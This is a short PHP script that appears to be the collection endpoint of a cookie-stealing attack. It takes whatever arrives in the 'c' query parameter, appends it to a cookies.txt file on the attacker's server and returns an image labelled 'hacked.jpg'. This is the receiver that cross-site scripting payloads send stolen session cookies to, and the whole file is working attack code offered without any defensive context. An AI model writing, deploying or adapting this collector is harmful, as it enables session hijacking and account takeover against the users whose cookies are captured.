<?php
$cfile = file_get_contents('cookies.txt');
$s = $_GET['c'];
$cfile .= "\n" . $s;
file_put_contents('cookies.txt', $cfile);
echo " <img src=\"hacked.jpg\" height=\"239\" width=\"600\"> ";
